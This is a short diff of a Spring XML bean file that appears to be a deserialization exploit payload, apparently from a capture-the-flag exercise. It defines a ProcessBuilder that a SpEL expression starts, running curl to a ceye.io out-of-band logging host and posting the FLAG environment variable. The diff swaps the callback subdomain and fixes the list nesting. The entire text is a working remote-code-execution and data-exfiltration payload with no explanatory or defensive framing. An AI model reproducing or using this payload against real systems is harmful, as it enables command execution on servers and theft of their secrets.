@@ -7,12 +7,10 @@
   <bean id="pb" class="java.lang.ProcessBuilder">
      <constructor-arg>
         <list>
-            <list>
           <value>curl</value>
-          <value>jackson.zg80gf.ceye.io</value>
+          <value>local.zg80gf.ceye.io</value>
           <value>-d</value>
           <value>flag=#{ systemEnvironment['FLAG'] }</value>
-        </list>
         </list>
     </constructor-arg>
      <property name="whatever" value="#{ pb.start() }"/>
